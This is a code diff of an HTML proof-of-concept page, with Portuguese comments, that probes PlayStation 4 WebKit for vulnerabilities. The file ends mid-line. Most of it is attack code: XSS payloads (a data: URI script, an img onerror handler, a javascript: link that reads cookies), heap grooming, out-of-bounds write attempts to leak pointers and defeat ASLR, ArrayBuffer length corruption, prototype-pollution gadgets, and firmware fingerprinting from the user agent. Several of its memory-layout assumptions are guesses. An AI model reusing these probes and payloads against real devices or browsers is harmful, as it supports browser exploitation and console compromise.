@@ -2,11 +2,12 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit PoC - Info Leak Probes v3</title>
+    <title>PS4 WebKit PoC - Advanced Probes v4</title>
     <style>
         /* Estilos CSS (mantidos) */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
-        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
+        #user-agent-info { background: #333; color: #0f0; padding: 5px; margin-bottom: 10px; white-space: pre-wrap; }
+        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 75vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
         .log-info { color: #6cf; }
         .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
         .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
@@ -21,8 +22,9 @@
     </style>
 </head>
 <body>
-    <h1>PS4 WebKit PoC - Info Leak Probes v3</h1>
-    <p>Foco: Tentar vazar endereços (ASLR Bypass) via OOB Write.</p>
+    <h1>PS4 WebKit PoC - Advanced Probes v4</h1>
+    <p>Foco: Heap Grooming + Leak, Corrupção de Length, Info Navegador.</p>
+    <div id="user-agent-info">Recuperando User Agent...</div>
     <div id="controls">
         </div>
     <div id="poc-output"></div>
@@ -37,221 +39,245 @@
         const SHORT_PAUSE = 50;
 
         // --- Funções Auxiliares ---
-        // Função para verificar se um valor 64-bit parece um ponteiro (heurística simples)
-        // Assume arquitetura 64-bit. Ajustar ranges conforme necessário.
-        const isPotentialPointer = (high, low) => {
-            // Não pode ser zero
-            if (high === 0 && low === 0) return false;
-            // Não pode ser valor pequeno (improvável ser ponteiro válido)
-            if (high === 0 && low < 0x10000) return false;
-            // Deve estar em um range 'razoável' (ex: não FF..FF, não muito baixo)
-            // Exemplo: Assume que ponteiros válidos não estão no primeiro GB nem são FF...
-            // ISSO É UMA HEURÍSTICA MUITO FRACA!
-             if (high === 0 && low < 0x40000000) return false; // Abaixo de 1GB
-             if (high > 0xF0000000) return false; // Muito alto (ex: FFFF...)
+        const isPotentialPointer = (high, low) => { /* Função isPotentialPointer igual anterior */
+            if(high===0&&low===0)return false; if(high===0&&low<0x10000)return false;
+            // Heurística MUITO simples de range (ex: não muito baixo, não FF..)
+            // Pode precisar de ajuste drástico dependendo da arquitetura/OS.
+            const mightBeHeap = high >= 0x10 && high < 0x80000000; // Chute MUITO largo para heap
+            const mightBeCode = high >= 0x1 && high < 0x100; // Chute MUITO largo para código
+            // Não pode ser endereço obviamente inválido como 0x41414141...
+             if (low === 0x41414141 || high === 0x41414141) return false;
 
-            // Verificar alinhamento (opcional, mas comum para ponteiros)
-             if (low % 8 !== 0) {
-                 // log(`  (Valor ${high.toString(16)}:${low.toString(16)} não alinhado a 8 bytes)`, 'info');
-                 // return false; // Descomentar para exigir alinhamento
-             }
-            return true;
+            // if(low % 8 !== 0) return false; // Descomentar para exigir alinhamento 8-byte
+            //return mightBeHeap || mightBeCode; // Retorna true se estiver em algum range 'possível'
+            return high > 0 || low >= 0x10000; // Simplificado: apenas não ser valor muito pequeno
         };
 
+        // --- Coleta de User Agent ---
+        const displayUserAgent = () => {
+            const ua = navigator.userAgent || "N/A";
+            const uaDiv = document.getElementById('user-agent-info');
+            if (uaDiv) {
+                uaDiv.textContent = `User Agent: ${ua}`;
+            }
+            log(`User Agent: ${ua}`, 'info');
+            // Tentar extrair versão do WebKit (pode não funcionar)
+            const webkitMatch = ua.match(/AppleWebKit\/([0-9.]+)/);
+            if (webkitMatch && webkitMatch[1]) {
+                 log(`Versão WebKit (aproximada): ${webkitMatch[1]}`, 'info');
+            }
+            const ps4Match = ua.match(/(PlayStation 4|PLAYSTATION 4)\/([0-9.]+)/);
+             if (ps4Match && ps4Match[2]) {
+                 log(`Versão Firmware PS4 (do UA): ${ps4Match[2]}`, 'info');
+            }
+        };
+
+
         // --- Teste 1: XSS (Mantido) ---
-        // ... (código do Teste 1 idêntico ao script v2) ...
+        // ... (código do Teste 1 idêntico ao script v3) ...
         const demonstrateXSS_Alert = () => { log("Payload XSS: Tentando alert()...", 'warn'); try { alert('XSS Executado via Alert!'); } catch (e) { log(`Alerta bloqueado: ${e.message}`, 'good'); } };
         const demonstrateXSS_DOM = () => { log("Payload XSS: Tentando manipulação DOM...", 'warn'); try { const target = document.getElementById('xss-target-div'); if (target) { target.innerHTML = '<h2 class="log-vuln">XSS DOM Executado!</h2><img src=x onerror=alert(\'XSS_DOM_ONERROR\')>'; log("Manipulação DOM realizada (verificar área de teste).", 'vuln'); } else { log("Div alvo para XSS DOM não encontrado.", 'error'); } } catch (e) { log(`Erro XSS DOM: ${e.message}`, 'error'); } };
         const demonstrateXSS_Cookie = () => { log("Payload XSS: Tentando ler cookie...", 'warn'); try { const c = document.cookie; log(`Cookie lido (pode estar vazio ou HttpOnly): '${c}'`, c ? 'vuln' : 'info'); } catch(e) { log(`Erro ao ler cookie: ${e.message}`, 'warn'); } };
-        const runCSP_XSS = () => {
-            log("--- Iniciando Teste 1: CSP Bypass + Payloads XSS ---", 'test');
-            log("Tentando carregar payload XSS (alert) via data: URI...", 'subtest');
-            try { const payloadJS = `log("[Payload Data:] Executando alert...", "warn"); try { alert('XSS via Data URI!'); } catch(e) { log("[Payload Data:] Alerta bloqueado.", "good"); }`; const encodedPayload = btoa(payloadJS); const s1 = document.createElement('script'); s1.src = 'data:text/javascript;base64,' + encodedPayload; s1.onerror = () => { log("ERRO: Falha ao carregar script data:!", 'error');}; document.body.appendChild(s1); log("Tag script data: (alert) adicionada.", 'info'); } catch (e) { log(`Erro data:: ${e.message}`, 'warn'); }
-             log("Tentando disparar XSS DOM via inline handler (onerror)...", 'subtest');
-            try { const i = document.createElement('img'); i.src = 'x'; i.setAttribute('onerror', "log('Handler onerror disparado!', 'info'); demonstrateXSS_DOM();"); document.body.appendChild(i); log("Tag img onerror (DOM XSS) adicionada.", 'info'); } catch (e) { log(`Erro onerror: ${e.message}`, 'warn'); }
-             log("Injetando link javascript: URI (leitura de cookie)...", 'subtest');
-             try { const a = document.createElement('a'); a.href = "javascript:log('Link JS URI Clicado!', 'warn'); demonstrateXSS_Cookie();"; a.textContent = "[Clique AQUI para Testar JS URI (Cookie XSS)]"; a.style.cssText='display:block;margin:5px;color:orange;border:1px solid orange;padding:3px;'; const placeholder = document.getElementById('js-link-placeholder'); if(placeholder) placeholder.replaceWith(a); else document.getElementById('controls').appendChild(a); log("Link JS URI adicionado (requer clique).", 'warn'); } catch (e) { log(`Erro ao criar link javascript:: ${e.message}`, 'warn'); }
-            log("--- Teste 1 Concluído ---", 'test');
-        };
+        const runCSP_XSS = () => { log("--- Iniciando Teste 1: CSP Bypass + Payloads XSS ---",'test'); try{const pL=`log("[PD] Exec alert...","warn");try{alert('XSS DataURI');}catch(e){log("[PD] Bloq.","good");}`;const eP=btoa(pL);const s=document.createElement('script');s.src='data:text/javascript;base64,'+eP;s.onerror=()=>{log("ERRO data:!","error");};document.body.appendChild(s);log("Tag script data: add.",'info');}catch(e){log(`Erro data:: ${e.message}`,'warn');} try{const i=document.createElement('img');i.src='x';i.setAttribute('onerror',"log(' onerror disp!','info');demonstrateXSS_DOM();");document.body.appendChild(i);log("Tag img onerror add.",'info');}catch(e){log(`Erro onerror: ${e.message}`,'warn');} try{const a=document.createElement('a');a.href="javascript:log('Link JS Click!','warn');demonstrateXSS_Cookie();";a.textContent="[Clique AQUI Teste JS URI (Cookie XSS)]";a.style.cssText='display:block;margin:5px;color:orange;border:1px solid orange;padding:3px;';const h=document.getElementById('js-link-placeholder');if(h)h.replaceWith(a);else document.getElementById('controls').appendChild(a);log("Link JS URI add (req clique).",'warn');}catch(e){log(`Erro link JS: ${e.message}`,'warn');} log("--- Teste 1 Concluído ---",'test'); };
 
 
-        // --- NOVO Teste 2: Advanced Info Leak Probes v3 ---
-        const runAdvancedLeakProbes_v3 = async () => {
-            log("--- Iniciando Teste 2: Advanced Info Leak Probes v3 ---", 'test');
-            log("Objetivo: Tentar vazar ponteiros via OOB R/W para bypass ASLR.", 'warn');
+        // --- NOVO Teste 2: Heap Grooming + Leak v4 ---
+        const runHeapGroomingLeak_v4 = async () => {
+            log("--- Iniciando Teste 2: Heap Grooming + Leak v4 ---", 'test');
+            log("AVISO: Tentativa MUITO básica de heap grooming. Alta chance de crash.", 'warn');
 
-            const bufferSize = 64;
-            const oobWriteOffsets = [-1, -8, bufferSize, bufferSize + 8]; // Onde tentar a escrita OOB
-            const oobReadOffsetsBytes = [-48, -32, -24, -16, -8, 8, 16, 24, 32, 48]; // Onde tentar ler OOB
+            const groomAllocations = [];
+            const groomCount = 500; // Número de alocações para grooming
+            const groomSize = 1024; // Tamanho das alocações de grooming (1KB)
+            const freePattern = 2; // Liberar 1 a cada 'freePattern' blocos
 
-            // Tipos de objetos a colocar perto do buffer atacante
-            const victimFactories = {
-                "String": () => "S".repeat(128),
-                "Float64Array": () => new Float64Array(32),
-                "Int32Array": () => new Int32Array(32),
-                "Array": () => [1.1, 2.2, 3.3, 4.4, {}], // Array com números e objeto
-                "HTMLElement": () => { const d = document.createElement('div'); d.textContent="LeakTestDiv"; return d; }
-            };
-
-            for (const victimName in victimFactories) {
-                for (const writeOffset of oobWriteOffsets) {
-                    log(`Testando Leak: Escrita OOB @${writeOffset}, Vítima: ${victimName}`, 'subtest');
-                    let victimObj = null;
-                    let attackerBuffer = null;
-                    let u8view = null;
-                    let dataView = null;
-                    let potentialLeakFound = false;
-
-                    try {
-                        // Alocar vítima e atacante (sem spray complexo por enquanto)
-                        victimObj = victimFactories[victimName]();
-                        attackerBuffer = new ArrayBuffer(bufferSize);
-                        u8view = new Uint8Array(attackerBuffer);
-                        dataView = new DataView(attackerBuffer);
-                        log(`  Atacante (Buffer ${bufferSize}B) e Vítima (${victimName}) alocados.`, 'info');
-
-                        // Realizar escrita OOB
-                        const writeValue = 0xBB; // Valor arbitrário
-                        try {
-                            u8view[writeOffset] = writeValue;
-                            log(`  Escrita OOB @${writeOffset} com ${writeValue} realizada.`, 'good');
-                        } catch (e) {
-                            log(`  Escrita OOB @${writeOffset} falhou (esperado para offsets > ${bufferSize}?): ${e.message}`, writeOffset >= bufferSize ? 'good' : 'error');
-                            // Continuar mesmo se a escrita falhar, para testar leitura OOB de qualquer forma
-                        }
-                        await new Promise(r => setTimeout(r, SHORT_PAUSE));
-
-                        // Tentar Leitura OOB em vários offsets
-                        log(`  Lendo OOB nos offsets (bytes): ${oobReadOffsetsBytes.join(', ')}`, 'info');
-                        for (const baseReadOffset of oobReadOffsetsBytes) {
-                            const absoluteReadAddr = bufferSize + baseReadOffset; // Endereço relativo ao FIM do buffer
-
-                            // Ler como U64 (aproximado)
-                            try {
-                                const low = dataView.getUint32(absoluteReadAddr, true);
-                                const high = dataView.getUint32(absoluteReadAddr + 4, true);
-                                if (low !== 0 || high !== 0) {
-                                    const ptrLike = isPotentialPointer(high, low);
-                                    log(`    Leak U64 @Byte ${baseReadOffset}: H=0x${high.toString(16).padStart(8,'0')} L=0x${low.toString(16).padStart(8,'0')}`, ptrLike ? 'ptr' : 'leak');
-                                    if (ptrLike) {
-                                         log(`      >> POTENCIAL PONTEIRO ENCONTRADO! <<`, 'vuln'); potentialLeakFound = true;
-                                    }
-                                }
-                            } catch (e) { /* Silenciar erros esperados */ }
-
-                            // Ler como F64 (menos provável ser ponteiro, mas pode vazar outros dados)
-                            // try {
-                            //     const valF64 = dataView.getFloat64(absoluteReadAddr, true);
-                            //     if (!isNaN(valF64) && valF64 !== 0) {
-                            //         log(`    Leak F64 @Byte ${baseReadOffset}: ${valF64}`, 'leak');
-                            //     }
-                            // } catch (e) { /* Silenciar erros */ }
-                        } // Fim loop leitura OOB
-
-                    } catch (e) {
-                        log(`  Erro durante teste (Vítima ${victimName}, Escrita @${writeOffset}): ${e.message}`, 'error');
-                    } finally {
-                        // Limpeza manual (ajuda GC?)
-                        victimObj = null;
-                        attackerBuffer = null;
-                        u8view = null;
-                        dataView = null;
-                    }
-                     if (potentialLeakFound) {
-                        log(`  >>> Potenciais ponteiros vazados com escrita OOB @${writeOffset} perto de ${victimName}! <<<`, 'vuln');
-                    } else {
-                         log(`  Nenhum leak promissor (ponteiro) encontrado com escrita @${writeOffset} perto de ${victimName}.`, 'info');
-                     }
-                    await new Promise(r => setTimeout(r, SHORT_PAUSE)); // Pausa entre escritas OOB
-                } // Fim loop escrita OOB
-                 await new Promise(r => setTimeout(r, PAUSE_DURATION)); // Pausa maior entre tipos de vítima
-            } // Fim loop tipos de vítima
-
-
-            // --- Tentativa de Leak estilo UAF Simples ---
-            log(`Testando Leak estilo UAF Simples...`, 'subtest');
             try {
-                const uafBufferSize = 128;
-                let bufferA = new ArrayBuffer(uafBufferSize);
-                let bufferB_victim = new ArrayBuffer(uafBufferSize); // Vítima
-                let u8A = new Uint8Array(bufferA);
-                let u8B = new Uint8Array(bufferB_victim); // Visão inicial da vítima
+                // Fase 1: Alocação em Massa
+                log(`Grooming: Alocando ${groomCount} buffers de ${groomSize} bytes...`, 'info');
+                for (let i = 0; i < groomCount; i++) {
+                    groomAllocations.push(new ArrayBuffer(groomSize));
+                }
+                log("Grooming: Alocação concluída.", 'info');
+                await new Promise(r=>setTimeout(r,SHORT_PAUSE));
 
-                 log("  Buffers A (atacante) e B (vítima) alocados.", "info");
+                // Fase 2: Liberação em Padrão
+                log(`Grooming: Liberando 1 a cada ${freePattern} buffers...`, 'info');
+                let freedCount = 0;
+                for (let i = 0; i < groomCount; i++) {
+                    if (i % freePattern === 0) {
+                        groomAllocations[i] = null; // Liberar referência (ajuda GC)
+                        freedCount++;
+                    }
+                }
+                log(`Grooming: ${freedCount} buffers liberados (GC pode demorar).`, 'info');
+                await new Promise(r=>setTimeout(r,SHORT_PAUSE * 2)); // Pausa maior para GC?
 
-                 // Escrever OOB de A, tentando atingir B (offset bufferSize)
-                 const uafWriteOffset = uafBufferSize;
-                 const uafWriteValue = 0xDD;
-                 try {
-                     u8A[uafWriteOffset] = uafWriteValue;
-                     log(`  Escrita OOB de A @${uafWriteOffset} com ${uafWriteValue} realizada.`, 'good');
-                     // Verificar se B foi atingido (como no Teste 3 v2 - provavelmente não funcionará diretamente)
-                     log(`  Primeiro byte de B agora: ${u8B[0]}`, u8B[0] === uafWriteValue ? 'vuln' : 'info');
-                 } catch(e) { log(`  Escrita OOB de A falhou: ${e.message}`, 'error'); }
+                // Fase 3: Alocar Atacante e Vítima
+                log("Alocando Atacante (64B) e Vítima (ArrayBuffer 128B) após grooming...", 'info');
+                const attackerBuffer = new ArrayBuffer(64);
+                const victimBuffer = new ArrayBuffer(128); // Vítima diferente do grooming
+                const u8view = new Uint8Array(attackerBuffer);
+                const dataView = new DataView(attackerBuffer);
+                log("Atacante e Vítima alocados.", 'info');
 
-                 // "Liberar" B
-                 bufferB_victim = null;
-                 u8B = null;
-                 log("  Buffer B (vítima) 'liberado' (setado para null).", "info");
-                 await new Promise(r => setTimeout(r, SHORT_PAUSE * 2)); // Pausa para GC?
+                // Fase 4: Tentativa de OOB Write + Read (similar ao Teste 2 v3)
+                const oobWriteOffsets = [-1, -8, 64, 72];
+                const oobReadOffsetsBytes = [-48, -32, -24, -16, -8, 8, 16, 24, 32, 48];
+                let potentialLeakFound = false;
 
-                 // Alocar novo objeto (String) na esperança que reutilize a memória de B
-                 const replacementString = "C".repeat(uafBufferSize - 1) + "X"; // String de tamanho similar
-                 log(`  Alocando String substituta de tamanho ${replacementString.length}...`, 'info');
+                for (const writeOffset of oobWriteOffsets) {
+                    log(`  Testando: Escrita OOB @${writeOffset} após grooming...`, 'subtest');
+                     try { u8view[writeOffset] = 0xAA; log(`    Escrita OOB @${writeOffset} OK.`, 'good'); }
+                     catch (e) { log(`    Escrita OOB @${writeOffset} falhou: ${e.message}`, 'warn'); continue; } // Pular se escrita falhar
 
-                 // Ler a String substituta - pode conter restos da escrita OOB?
-                 // Acesso a caracteres individuais pode ser otimizado, ler via ArrayBuffer pode ser melhor
-                 // Mas vamos apenas imprimir a string por enquanto
-                 log(`  String substituta (primeiros/últimos chars): ${replacementString.substring(0,10)}...${replacementString.substring(replacementString.length-10)}`, 'info');
-                 // Verificar se o último caractere foi corrompido (seria 'X' se não corrompido)
-                 const lastChar = replacementString.charCodeAt(replacementString.length-1);
-                 const expectedLastChar = "X".charCodeAt(0);
-                 log(`  Último charCode da string: ${lastChar} (Esperado: ${expectedLastChar})`, lastChar === uafWriteValue ? 'leak' : 'info');
-                 if (lastChar === uafWriteValue) {
-                     log("    >> POTENCIAL LEAK/CORRUPÇÃO UAF DETECTADO! <<", 'vuln');
-                 }
+                     await new Promise(r=>setTimeout(r,SHORT_PAUSE));
+                     log(`    Lendo OOB nos offsets: ${oobReadOffsetsBytes.join(', ')}`, 'info');
 
-            } catch(e) { log(`  Erro no teste UAF Simples: ${e.message}`, 'error'); }
+                     for(const baseReadOffset of oobReadOffsetsBytes) {
+                         const absoluteReadAddr = attackerBuffer.byteLength + baseReadOffset;
+                         try { // Ler U64
+                             const low = dataView.getUint32(absoluteReadAddr, true);
+                             const high = dataView.getUint32(absoluteReadAddr + 4, true);
+                             if (low !== 0 || high !== 0) {
+                                 const ptrLike = isPotentialPointer(high, low);
+                                 log(`      Leak U64 @Byte ${baseReadOffset}: H=0x${high.toString(16).padStart(8,'0')} L=0x${low.toString(16).padStart(8,'0')}`, ptrLike ? 'ptr' : 'leak');
+                                 if (ptrLike) {
+                                     log(`        >> POTENCIAL PONTEIRO ENCONTRADO! (Após Grooming) <<`, 'vuln'); potentialLeakFound = true;
+                                 }
+                             }
+                         } catch (e) { /* Silenciar */ }
+                     } // Fim loop leitura
+                     if (potentialLeakFound) break; // Parar se encontrar algo
+                } // Fim loop escrita
 
+                if (!potentialLeakFound) {
+                    log("Nenhum leak promissor (ponteiro) encontrado após grooming.", 'warn');
+                }
+
+            } catch (e) {
+                 log(`Erro GERAL no Teste 2 (Grooming + Leak): ${e.message} ${e.stack}`, 'error');
+            } finally {
+                 // Limpar groomAllocations para liberar memória
+                 for(let i=0; i<groomAllocations.length; i++) { groomAllocations[i] = null; }
+            }
             log("--- Teste 2 Concluído ---", 'test');
         };
 
 
-        // --- Teste 3: Spray v2 (Mantido como referência) ---
-        // ... (código do Teste 3 idêntico ao script v2) ...
-        const runSprayAndCorrupt_v2 = async () => { /* ... código igual ao v2 ... */
-             log("--- Iniciando Teste 3: Spray v2 (Ref.) ---", 'test'); log("AVISO: Suposições sobre layout. Chance de falha/crash.",'warn'); try { const sprayCount=50;const bufferSize=128; const allocations=[]; log(`Alocando ${sprayCount} ArrayBuffers de ${bufferSize} bytes...`,'info'); for(let i=0;i<sprayCount;i++){allocations.push(new ArrayBuffer(bufferSize));} log("Alocação concluída.",'info'); const attackIndex=Math.floor(sprayCount/2); const victimIndex=attackIndex+1; if(victimIndex>=sprayCount){log("Não há buffer vítima.",'warn');return;} const attackerBuffer=allocations[attackIndex]; const victimBuffer=allocations[victimIndex]; const attackerView=new Uint8Array(attackerBuffer); const victimView=new Uint8Array(victimBuffer); const victimDataView=new DataView(victimBuffer); log(`Atacante: ${attackIndex}, Vítima: ${victimIndex}.`,'info'); let originalVictimSize=-1; try{originalVictimSize=victimDataView.buffer.byteLength;}catch(e){} log(`Tam original vítima: ${originalVictimSize}`,'info'); const writeValue=0xCC; const writeOffset=bufferSize; try{ log(`Tentando escrita OOB Atacante[${attackIndex}] -> Vítima[${victimIndex}] @offset ${writeOffset} val ${writeValue}...`,'subtest'); attackerView[writeOffset]=writeValue; log("Escrita OOB realizada. Verif vítima...",'vuln'); try{ const firstByte=victimView[0]; log(`Primeiro byte Vítima[${victimIndex}]: ${firstByte}`,firstByte===writeValue?'vuln':'info'); if(firstByte===writeValue){log(" >> CORRUPÇÃO DIRETA CONFIRMADA! <<",'vuln');} else {log(" Corrupção início não confirmada.",'warn');} }catch(e){log(`Erro ler vítima: ${e.message}`,'error');} const sizeWriteOffset=bufferSize-8; const newSizeLow=0xFFFFFFFF; const newSizeHigh=0x7FFFFFFF; try { log(`Tentando corromper tamanho Vítima @offset ${sizeWriteOffset}...`,'subtest'); const attackDataView=new DataView(attackerBuffer); attackDataView.setUint32(sizeWriteOffset, newSizeLow, true); attackDataView.setUint32(sizeWriteOffset+4, newSizeHigh, true); log("Escrita OOB tamanho realizada.",'vuln'); let currentVictimSize=-1; try{currentVictimSize=victimDataView.buffer.byteLength;}catch(e){} log(`Tamanho atual Vítima: ${currentVictimSize}`,(currentVictimSize!==originalVictimSize&&currentVictimSize>bufferSize)?'vuln':'info'); if(currentVictimSize!==originalVictimSize&&currentVictimSize>bufferSize){log(" >> TAMANHO VÍTIMA CORROMPIDO! <<",'vuln'); try { const oobReadIdx=bufferSize+10; const oobVal=victimView[oobReadIdx]; log(` Leitura OOB Vítima[@${oobReadIdx}]: ${oobVal}`,'leak'); } catch(e){log(` Leitura OOB Vítima falhou: ${e.message}`,'warn');}} else {log(" Corrupção tamanho não confirmada.",'warn');} } catch(e){log(`Erro corromper tamanho: ${e.message}`,'error');} } catch(writeError){log(`✅ Escrita OOB inicial bloqueada: ${writeError.message}`,'good');} } catch(e){log(`Erro GERAL Spray v2: ${e.message}`,'error');} log("--- Teste 3 Concluído ---",'test');};
+        // --- NOVO Teste 3: Corrupção de Length v4 ---
+        const runLengthCorruption_v4 = async () => {
+            log("--- Iniciando Teste 3: Corrupção de Length v4 ---", 'test');
+            log("AVISO: Tenta corromper metadados (byteLength). Suposições de layout! Risco de Crash!", 'warn');
+
+            const bufferSize = 128;
+            let attackerBuffer = null;
+            let victimBuffer = null;
+            let attackerView = null;
+            let victimView = null;
+            let attackDataView = null;
+            let victimDataView = null;
+
+            try {
+                // Alocar atacante e vítima adjacentes na esperança...
+                log(`Alocando Atacante e Vítima (ambos ${bufferSize}B)...`, 'info');
+                attackerBuffer = new ArrayBuffer(bufferSize);
+                victimBuffer = new ArrayBuffer(bufferSize); // Vítima do mesmo tamanho
+                attackerView = new Uint8Array(attackerBuffer);
+                victimView = new Uint8Array(victimBuffer);
+                attackDataView = new DataView(attackerBuffer);
+                victimDataView = new DataView(victimBuffer);
+                log("Alocação concluída.", 'info');
+
+                const originalVictimLength = victimBuffer.byteLength;
+                log(`Tamanho original da vítima: ${originalVictimLength}`, 'info');
+
+                // Onde *achamos* que o campo 'length' da vítima pode estar,
+                // relativo ao INÍCIO do buffer atacante.
+                // Suposição 1: Vítima começa logo após atacante (bufferSize bytes depois).
+                // Suposição 2: O campo 'length' (64 bits) está 8 bytes ANTES do ponteiro de dados da vítima.
+                // Portanto, offset = bufferSize (início da vítima) - 8 (antes do ponteiro de dados)
+                const lengthWriteOffset = bufferSize - 8;
+
+                // Novo tamanho desejado (enorme)
+                const newLengthLow = 0xFFFFFFFF;
+                const newLengthHigh = 0x0FFFFFFF; // Usar valor < 0x7FFFFFFF para evitar problemas com sinal?
+
+                log(`Tentando escrever novo tamanho (H=${newLengthHigh.toString(16)}, L=${newLengthLow.toString(16)}) via OOB do Atacante @offset ${lengthWriteOffset}...`, 'subtest');
+
+                try {
+                    // Usar DataView do atacante para escrever 64 bits OOB
+                    attackDataView.setUint32(lengthWriteOffset, newLengthLow, true); // Little-endian
+                    attackDataView.setUint32(lengthWriteOffset + 4, newLengthHigh, true);
+                    log("Escrita OOB para tamanho realizada.", 'vuln');
+
+                    // VERIFICAR TAMANHO DA VÍTIMA
+                    const currentVictimLength = victimBuffer.byteLength;
+                    log(`Tamanho ATUAL da vítima: ${currentVictimLength}`, (currentVictimLength !== originalVictimLength) ? 'vuln' : 'info');
+
+                    if (currentVictimLength !== originalVictimLength && currentVictimLength > bufferSize) {
+                        log("   >> SUCESSO! Tamanho da Vítima Corrompido! <<", 'vuln');
+
+                        // TENTAR LER OOB DA VÍTIMA (agora que tem tamanho 'maior')
+                        const victimReadOffset = originalVictimLength + 16; // Ler além do tamanho original
+                        try {
+                            log(`   Tentando ler OOB da VÍTIMA @${victimReadOffset}...`, 'subtest');
+                            const leakedValue = victimView[victimReadOffset]; // Ler 1 byte
+                             // Tentar ler 8 bytes como U64
+                             const leakedU64Low = victimDataView.getUint32(victimReadOffset, true);
+                             const leakedU64High = victimDataView.getUint32(victimReadOffset + 4, true);
+                             const ptrLike = isPotentialPointer(leakedU64High, leakedU64Low);
+
+                            log(`   Leitura OOB da Vítima retornou (U8): ${leakedValue}`, 'leak');
+                            log(`   Leitura OOB da Vítima retornou (U64): H=0x${leakedU64High.toString(16)} L=0x${leakedU64Low.toString(16)}`, ptrLike ? 'ptr' : 'leak');
+                            if(ptrLike) log(`     >> POTENCIAL PONTEIRO VAZADO DA VÍTIMA! <<`, 'vuln');
+
+                        } catch (e) { log(`   Leitura OOB da Vítima falhou: ${e.message}`, 'warn'); }
+                    } else {
+                        log("   Falha: Tamanho da vítima não mudou ou não aumentou.", 'warn');
+                    }
+                } catch (e) {
+                    log(`Erro ao tentar escrever OOB para tamanho: ${e.message}`, 'error');
+                }
+
+            } catch (e) {
+                log(`Erro GERAL no Teste 3 (Length Corruption): ${e.message}`, 'error');
+            } finally {
+                attackerBuffer = null; victimBuffer = null; // GC help
+            }
+            log("--- Teste 3 Concluído ---", 'test');
+        };
+
 
         // --- Teste 4: OOB Write Confirm (Mantido) ---
-        // ... (código do Teste 4 idêntico ao script v2) ...
-        const runOOBTestU8_Confirm = async () => { /* ... código igual ao v2 ... */ log("--- Iniciando Teste 4: OOB Write (Confirmação) ---",'test'); try{const bS=32; const b=new ArrayBuffer(bS); const v=new Uint8Array(b); const wV=0xEE; const wO=[-1,bS,bS+10]; for(const o of wO){ log(`Tentar OOB U8 @${o}...`,'subtest'); try{v[o]=wV;log(`VULN: OOB U8 @${o} OK!`,'vuln');}catch(e){log(`✅ OOB U8 @${o} Bloq: ${e.message}`,'good');} await new Promise(r=>setTimeout(r,SHORT_PAUSE));}}catch(e){log(`Erro teste 4: ${e.message}`,'error');} log("--- Teste 4 Concluído ---",'test'); };
+        const runOOBTestU8_Confirm = async () => { /* ... código igual ao v3 ... */ log("--- Iniciando Teste 4: OOB Write (Confirmação) ---",'test'); try{const bS=32; const b=new ArrayBuffer(bS); const v=new Uint8Array(b); const wV=0xEE; const wO=[-1,bS,bS+10]; for(const o of wO){ log(`Tentar OOB U8 @${o}...`,'subtest'); try{v[o]=wV;log(`VULN: OOB U8 @${o} OK!`,'vuln');}catch(e){log(`✅ OOB U8 @${o} Bloq: ${e.message}`,'good');} await new Promise(r=>setTimeout(r,SHORT_PAUSE));}}catch(e){log(`Erro teste 4: ${e.message}`,'error');} log("--- Teste 4 Concluído ---",'test'); };
 
-        // --- Teste 5: PP v2 Gadgets (Mantido) ---
-        // ... (código do Teste 5 idêntico ao script v2) ...
-        const runPPGadgets_v2 = () => { /* ... código igual ao v2 ... */ log("--- Iniciando Teste 5: PP v2 (Gadgets Simples) ---",'test'); const testKey='__pp_gadget_test__'; const testVal='<img src=x onerror=alert("PP_Gadget_XSS")>'; const gadgets=[{name:'innerHTML',target:()=>document.createElement('div')},{name:'srcdoc',target:()=>document.createElement('iframe')},]; let successCount=0; for(const gadget of gadgets){ log(`Testando PP gadget: '${gadget.name}'...`,'subtest'); try{ Object.prototype[gadget.name]=testVal; log(`Propriedade '${gadget.name}' polúida.`,'info'); const element=gadget.target(); if(element[gadget.name]===testVal){ log(`VULN: PP OK! Objeto herdou '${gadget.name}'.`,'vuln'); successCount++; try { log(`Tentando ativar gadget ${element.tagName}...`,'warn'); const container=document.getElementById('xss-target-div')||document.body; container.appendChild(element); log(`Elemento ${element.tagName} adicionado (verif alertas).`,'warn'); } catch(e){log(`Erro ativar gadget ${gadget.name}: ${e.message}`,'error');} } else { log(`Prop '${gadget.name}' Ñ parece herdada/poluída.`,'info'); } delete Object.prototype[gadget.name]; log(`Limpeza prop '${gadget.name}'.`,'info'); } catch(e){log(`Erro teste gadget '${gadget.name}': ${e.message}`,'error');} try{delete Object.prototype[gadget.name];}catch(e){} } if(successCount>0)log(`PP confirmada para ${successCount} gadget(s).`,'vuln'); else log("Nenhum gadget PP testado funcionou diretamente.",'warn'); log("--- Teste 5 Concluído ---",'test'); };
+        // --- Teste 5: PP v2 Gadgets (Mantido, opcional) ---
+        const runPPGadgets_v2 = () => { /* ... código igual ao v3 ... */ log("--- Iniciando Teste 5: PP v2 (Gadgets Simples) ---",'test'); const testKey='__pp_gadget_test__'; const testVal='<img src=x onerror=alert("PP_Gadget_XSS")>'; const gadgets=[{name:'innerHTML',target:()=>document.createElement('div')},{name:'srcdoc',target:()=>document.createElement('iframe')},]; let successCount=0; for(const gadget of gadgets){ log(`Testando PP gadget: '${gadget.name}'...`,'subtest'); try{ Object.prototype[gadget.name]=testVal; log(`Propriedade '${gadget.name}' polúida.`,'info'); const element=gadget.target(); if(element[gadget.name]===testVal){ log(`VULN: PP OK! Objeto herdou '${gadget.name}'.`,'vuln'); successCount++; try { log(`Tentando ativar gadget ${element.tagName}...`,'warn'); const container=document.getElementById('xss-target-div')||document.body; container.appendChild(element); log(`Elemento ${element.tagName} adicionado (verif alertas).`,'warn'); } catch(e){log(`Erro ativar gadget ${gadget.name}: ${e.message}`,'error');} } else { log(`Prop '${gadget.name}' Ñ parece herdada/poluída.`,'info'); } delete Object.prototype[gadget.name]; log(`Limpeza prop '${gadget.name}'.`,'info'); } catch(e){log(`Erro teste gadget '${gadget.name}': ${e.message}`,'error');} try{delete Object.prototype[gadget.name];}catch(e){} } if(successCount>0)log(`PP confirmada para ${successCount} gadget(s).`,'vuln'); else log("Nenhum gadget PP testado funcionou diretamente.",'warn'); log("--- Teste 5 Concluído 